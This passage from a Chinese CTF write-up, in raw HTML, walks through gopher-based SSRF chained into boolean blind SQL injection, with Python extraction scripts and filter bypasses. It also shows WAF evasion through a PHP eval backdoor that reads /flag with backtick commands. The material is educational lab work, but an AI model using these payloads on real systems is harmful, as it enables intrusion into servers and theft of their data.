class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/10/ROIS/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/10/ROIS/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/10/ROIS/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#判断数据库名第i个字符的ascii码是否为j，是的话为真会返回&quot;meow&quot;</span><br>        content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>        content_length = <span class="hljs-built_in">len</span>(content)<br>        data = \<br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>        result = urllib.parse.quote(data)<br>        result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>        payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<br>        r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>        <span class="hljs-comment">#print(r)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<br>            database += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(database)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#r</span><br><span class="hljs-comment">#ru</span><br><span class="hljs-comment">#rua</span><br><span class="hljs-comment">#数据库名为rua</span><br></code></pre></td></tr></table></figure><p>同样，爆表名，因为可能存在多个表，所以使用<code>group_concat()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br><span class="hljs-comment">#flag,</span><br><span class="hljs-comment">#flag,m</span><br><span class="hljs-comment">#flag,me</span><br><span class="hljs-comment">#flag,mes</span><br><span class="hljs-comment">#flag,mess</span><br><span class="hljs-comment">#flag,messa</span><br><span class="hljs-comment">#flag,messag</span><br><span class="hljs-comment">#flag,message</span><br><span class="hljs-comment">#flag,messages</span><br></code></pre></td></tr></table></figure><p>盲猜flag在flag表里，爆字段名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆字段名</span><br>        ...........<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#f</span><br><span class="hljs-comment">#fl</span><br><span class="hljs-comment">#fla</span><br><span class="hljs-comment">#flag</span><br></code></pre></td></tr></table></figure><p>已知信息：</p><p>数据库rua、表flag、字段flag，爆flag内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">126</span>):<br>        content = <span class="hljs-string">&quot;id=1 and (ascii(substr((select group_concat(flag) from flag),&#123;&#125;,1))=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,j)<span class="hljs-comment">#爆flag表内容</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230412103314980.png"></p><p>拿到flag，本题还可以用二分法优化算法，附上L1ao学长的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuck</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1290</span>):<br>        head=<span class="hljs-number">32</span><br>        tail=<span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> head&lt;tail:<br>            mid=(head+tail)&gt;&gt;<span class="hljs-number">1</span><br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            sqli = <span class="hljs-string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>            <span class="hljs-built_in">id</span> = urllib.parse.quote(sqli)<br>            id_length = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">id</span>)+<span class="hljs-number">3</span><br>            payload = <span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;id_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>            <span class="hljs-comment"># print(payload)</span><br>            tmp = urllib.parse.quote(payload)<br>            new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>            res = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new<br>            dataa = &#123;<br>                <span class="hljs-string">&quot;url&quot;</span>:res<br>            &#125;<br>            r = requests.post(url=url,data=dataa)<br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow meow meow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>                head=mid+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                tail=mid<br>        <span class="hljs-keyword">if</span> head !=<span class="hljs-number">32</span>:<br>            result+=<span class="hljs-built_in">chr</span>(head)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span>   <br>        <span class="hljs-built_in">print</span>(result)<br>fuck()<br></code></pre></td></tr></table></figure><p>当然，看到尝试传入递增变化的数据，bp爆破有时候也不失为一种方法（会用工具真的很重要（哭</p><p>（感谢LinTu提供的思路）</p><p><img src="/2023/02/10/ROIS/image-20230412130046708.png"></p><p>浏览器发送一次请求，记住python出payload的时候要url编码两次</p><p><img src="/2023/02/10/ROIS/image-20230412130722783.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130832052.png"></p><p><img src="/2023/02/10/ROIS/image-20230412130852364.png"></p><p>Intruder集束炸弹走起，两个爆破点一个是需判断字符的位置(从1开始)，一个是比较的ascii码(从32到126)。开始爆破</p><p><img src="/2023/02/10/ROIS/image-20230412130941926.png"></p><p>异样流量数据包对应Payload2按照Payload1顺序编码成字符，就是对应的flag了，因为bp是多线程，所以也不会很慢。也算提供了一种新思路吧。</p><hr><h3 id="cachewaf"><a href="#cachewaf" class="headerlink" title="cachewaf"></a>cachewaf</h3><p>一道初见被乱杀的防火墙绕过。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;waf.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>简短的题目，极致的享受（×</p><p>这eval就摆在面前就别怪system直接shell了(</p><p><img src="/2023/02/10/ROIS/image-20230408224620364.png"></p><p>emmm，说是右括号出了点问题，考虑到这道题有防火墙，先排查一下问题出哪了。<img src="/2023/02/10/ROIS/image-20230408223545003.png"></p><p>看起来括号本身应该不是问题，echo也没被过滤，引号也没问题，应该是system被拦截了，继续尝试。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;system&quot;</span>)(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408224700965.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls`;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408223928850.png"></p><p>(“system”)和反引号没被过滤。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `ls /`;<span class="hljs-comment">#查看根目录下发现存在/flag</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /flag`;<span class="hljs-comment">#尝试读取flag，结果没有回显，看起来flag被过滤了</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-keyword">echo</span> `cat /f*`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /fl<span class="hljs-string">&#x27;a&#x27;</span>g`;<br>cmd=<span class="hljs-keyword">echo</span> `cat /f?ag`;<br><span class="hljs-comment">#尝试上述两种绕过均可读取到flag</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230408232643615.png"></p><p>但是提交flag时发现是假的flag，果然不可能这么简单啊（悲</p><p>既然这样不妨看一看waf.php查看下防火墙规则吧（waf.php也被过滤了用w*绕过，网页直接读取文件没有分行实在难受，就用bp抓包后发传参了）</p><p><img src="/2023/02/10/ROIS/image-20230408233044629.png"></p><p>waf.php内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 